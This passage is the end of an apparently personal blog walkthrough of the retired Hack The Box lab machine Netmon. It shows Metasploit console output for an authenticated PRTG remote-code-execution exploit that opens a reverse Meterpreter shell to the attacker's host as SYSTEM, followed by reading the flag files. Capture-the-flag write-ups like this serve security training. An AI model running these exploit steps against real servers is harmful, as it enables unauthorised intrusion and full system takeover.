</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.129.96.142:80 - The target appears to be vulnerable.
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>Looks promising, let&rsquo;s <strong>run</strong> the <strong>exploit</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>windows/http/prtg_authenticated_rce<span class=o>)</span> &gt;&gt; run
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.11:4444 
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Successfully logged in with provided credentials
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Created malicious notification <span class=o>(</span><span class=nv>objid</span><span class=o>=</span>2019<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Triggered malicious notification
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Deleted malicious notification
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Waiting <span class=k>for</span> payload execution.. <span class=o>(</span><span class=m>30</span> sec. max<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>175686</span> bytes<span class=o>)</span> to 10.129.96.142
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>2</span> opened <span class=o>(</span>10.10.14.11:4444 -&gt; 10.129.96.142:51167<span class=o>)</span> at 2023-06-01 23:35:03 +0100
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=o>)</span> &gt; getuid
</span></span><span class=line><span class=cl>Server username: NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=o>)</span> &gt;
</span></span></code></pre></div><h2 id=post-exploitation><strong>POST-EXPLOITATION</strong><a hidden class=anchor aria-hidden=true href=#post-exploitation>#</a></h2><p>Wow, not only do we have a direct <strong>shell connection</strong> to our <strong>target</strong>, but it comes with the <strong>highest</strong> <strong>privileges</strong> possible. Hence no <strong>lateral movement</strong> or <strong>privilege escalation</strong> is needed for this box. All that&rsquo;s left for us to do now is to simply <strong>grab</strong> our <strong>flags</strong> and <strong>submit</strong> their values.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=o>)</span> &gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\W</span>indows<span class=o>)</span> &gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\)</span> &gt; <span class=nb>cd</span> Users<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> Users<span class=se>\\</span>Administrator<span class=se>\\</span>  <span class=nb>cd</span> Users<span class=se>\\</span>Default<span class=se>\ </span>User<span class=se>\\</span>  <span class=nb>cd</span> Users<span class=se>\\</span>Public<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> Users<span class=se>\\</span>All<span class=se>\ </span>Users<span class=se>\\</span>     <span class=nb>cd</span> Users<span class=se>\\</span>Default<span class=se>\\</span>        
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\)</span> &gt; <span class=nb>cd</span> Users<span class=se>\\</span>Public<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=o>)</span> &gt; ls
</span></span><span class=line><span class=cl>Listing: C:<span class=se>\U</span>sers<span class=se>\P</span>ublic
</span></span><span class=line><span class=cl><span class=o>========================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode              Size  Type  Last modified              Name
</span></span><span class=line><span class=cl>----              ----  ----  -------------              ----
</span></span><span class=line><span class=cl>040555/r-xr-xr-x  <span class=m>0</span>     dir   2019-02-03 12:08:38 +0000  AccountPictures
</span></span><span class=line><span class=cl>040555/r-xr-xr-x  <span class=m>4096</span>  dir   2019-02-03 04:18:02 +0000  Desktop
</span></span><span class=line><span class=cl>040555/r-xr-xr-x  <span class=m>4096</span>  dir   2019-02-03 12:05:38 +0000  Documents
</span></span><span class=line><span class=cl>040555/r-xr-xr-x  <span class=m>0</span>     dir   2016-07-16 14:18:05 +0100  Downloads
</span></span><span class=line><span class=cl>040555/r-xr-xr-x  <span class=m>0</span>     dir   2016-07-16 14:18:05 +0100  Libraries
</span></span><span class=line><span class=cl>040555/r-xr-xr-x  <span class=m>0</span>     dir   2016-07-16 14:18:05 +0100  Music
</span></span><span class=line><span class=cl>040555/r-xr-xr-x  <span class=m>0</span>     dir   2016-07-16 14:18:05 +0100  Pictures
</span></span><span class=line><span class=cl>040555/r-xr-xr-x  <span class=m>0</span>     dir   2016-07-16 14:18:05 +0100  Videos
</span></span><span class=line><span class=cl>100666/rw-rw-rw-  <span class=m>174</span>   fil   2016-07-16 14:16:27 +0100  desktop.ini
</span></span><span class=line><span class=cl>100444/r--r--r--  <span class=m>34</span>    fil   2023-06-01 21:15:43 +0100  user.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=o>)</span> &gt; cat user.txt 
</span></span><span class=line><span class=cl>&lt;user-flag&gt;
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=o>)</span> &gt; <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>AppData<span class=se>\\</span>            <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>My<span class=se>\ </span>Documents<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Application<span class=se>\ </span>Data<span class=se>\\</span>  <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>NetHood<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Contacts<span class=se>\\</span>           <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Pictures<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Cookies<span class=se>\\</span>            <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>PrintHood<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Desktop<span class=se>\\</span>            <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Recent<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Documents<span class=se>\\</span>          <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Saved<span class=se>\ </span>Games<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Downloads<span class=se>\\</span>          <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Searches<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Favorites<span class=se>\\</span>          <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>SendTo<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Links<span class=se>\\</span>              <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Start<span class=se>\ </span>Menu<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Local<span class=se>\ </span>Settings<span class=se>\\</span>    <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Templates<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Music<span class=se>\\</span>              <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Videos<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=o>)</span> &gt; <span class=nb>cd</span> ..<span class=se>\\</span>Administrator<span class=se>\\</span>Desktop<span class=se>\\</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=o>)</span> &gt; ls
</span></span><span class=line><span class=cl>Listing: C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl><span class=o>=======================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode              Size  Type  Last modified              Name
</span></span><span class=line><span class=cl>----              ----  ----  -------------              ----
</span></span><span class=line><span class=cl>100666/rw-rw-rw-  <span class=m>282</span>   fil   2019-02-03 12:08:39 +0000  desktop.ini
</span></span><span class=line><span class=cl>100444/r--r--r--  <span class=m>34</span>    fil   2023-06-01 21:15:43 +0100  root.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=o>)</span> &gt; cat root.txt 
</span></span><span class=line><span class=cl>&lt;root-flag&gt;
</span></span><span class=line><span class=cl><span class=o>(</span>Meterpreter 2<span class=o>)(</span>C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=o>)</span> &gt; 
</span></span></code></pre></div><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All that&rsquo;s left for us now is to simply <strong>terminate</strong> the <strong>target</strong> box (if not terminated already) <strong>before</strong> <strong>continuing</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/netmon/>netmon</a></li><li><a href=https://bluewalle.github.io/tags/windows-target/>windows-target</a></li><li><a href=https://bluewalle.github.io/tags/easy-box/>easy-box</a></li><li><a href=https://bluewalle.github.io/tags/user-own/>user-own</a></li><li><a href=https://bluewalle.github.io/tags/system-own/>system-own</a></li><li><a href=https://bluewalle.github.io/tags/retired/>retired</a></li><li><a href=https://bluewalle.github.io/tags/network/>network</a></li><li><a href=https://bluewalle.github.io/tags/vulnerability-assessment/>vulnerability-assessment</a></li><li><a href=https://bluewalle.github.io/tags/protocols/>protocols</a></li><li><a href=https://bluewalle.github.io/tags/outdated-software/>outdated-software</a></li><li><a href=https://bluewalle.github.io/tags/ftp/>ftp</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li><li><a href=https://bluewalle.github.io/tags/weak-authentication/>weak-authentication</a></li><li><a href=https://bluewalle.github.io/tags/anonymous-access/>anonymous-access</a></li><li><a href=https://bluewalle.github.io/tags/guest-access/>guest-access</a></li><li><a href=https://bluewalle.github.io/tags/metasploit-framework/>metasploit-framework</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>